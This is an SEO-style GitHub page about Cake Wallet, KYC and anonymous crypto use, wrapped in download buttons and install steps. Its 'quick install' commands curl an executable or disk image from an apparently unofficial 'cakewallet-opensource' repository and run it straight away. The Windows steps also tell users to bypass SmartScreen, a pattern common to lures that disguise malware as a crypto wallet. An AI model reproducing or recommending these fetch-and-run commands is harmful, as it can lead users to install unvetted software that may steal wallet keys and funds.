![Cake Wallet kyc anonymous guide](assets/cake-wallet-kyc-anonymous-article-banner.png)

# Cake Wallet KYC and Anonymous Use

Three layers: the wallet, the provider, and the chain itself.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Cake Wallet does not require an account or identity documents to hold, send or receive. Providers inside the app do their own checks when you buy or sell with a card or a bank. On-chain activity is public on transparent chains, so "anonymous" depends on the coin and on how you use it, not on the app.

<!-- ARTICLE-BODY-BEGIN -->

## What the app is
Cake Wallet is a non-custodial wallet: it holds your keys on your device and needs no sign-up. Opening it, creating a wallet and receiving funds involve no identity step at all, and the project states that it does not log usage or run analytics.

That is the first layer, and it is the only one the app controls. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md">What Cake Wallet is</a> covers the product and who makes it, which matters when a search result offers a "Cake Wallet" service that asks for documents to open a wallet.

## Where identity checks actually happen
The buy and sell flows route to third-party providers. Those providers decide whether a card payment needs documents, which countries they serve, and what they report; the wallet passes an address and shows the order. A provider asking for a passport is not Cake Wallet asking.

If you never use a fiat provider, no identity check occurs. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md">Buy Monero with Cake Wallet</a> explains that split, including why a card purchase of Monero attracts more scrutiny than a swap between coins you already hold.

## What self-custody does and does not hide
Self-custody means nobody can freeze your funds. It does not make a transparent chain private: Bitcoin and Ethereum record every address and amount forever, and analysis firms link addresses by behaviour, not by name.

Monero is private by default at the protocol level, which is a different property from a wallet's privacy. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md">Is Cake Wallet safe</a> covers what custody does and does not protect, so the two ideas stay separate.

## The chain decides anonymity
On transparent chains, the question "is this anonymous" has no yes or no answer: it depends on whether addresses were ever linked to you. Buying on a card, then sending to your own address, links them permanently.

Monero hides sender, receiver and amount by design, and that is a protocol property rather than an app feature. No wallet can make a transparent chain untraceable after the fact.

## Reporting and tax questions
Wallets do not report to tax authorities; they cannot, because they hold no customer records. Exchanges and fiat providers do file reports where the law requires it, which is why a purchase with a card is the part with a paper trail.

Whether HMRC, the IRS or another tax authority can see your crypto holdings depends on the jurisdiction and on what a provider reported, not on the wallet you use. A wallet is not a reporting entity and keeps no customer file to hand over.

## Install a current build
Privacy properties belong to the protocol and the app version. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a> so the privacy settings you rely on are the ones implemented in the build you are running.

Keep in mind that no setting on the phone can undo a purchase made with a card under your own name. The wallet layer is where you control keys, not where you erase history.

## FAQ
### Does Cake Wallet require KYC?
No: you do not need a KYC check to use a Cake Wallet wallet, and it is free of any identity step. Fiat providers inside the app run their own checks.
### Is Cake Wallet anonymous?
The app needs no account, but on transparent chains your addresses are public and a wallet can be tracked by anyone reading the chain. Monero is private by protocol.
### Does Cake Wallet log my activity?
The project states that it does not log usage or run analytics. Providers you buy from keep their own records.
### Can I convert XMR to BTC without KYC?
A swap between coins you already hold goes through a swap provider rather than a fiat provider. Its own terms apply, and it may still require checks.
### Is Monero untraceable?
Monero hides sender, receiver and amount by design. That is stronger than a transparent chain, not a promise about how you acquired the coins.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[buy Monero with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md) · [is Cake Wallet safe](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-safe-custody-keys.md) · [what Cake Wallet is](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-what-it-is.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
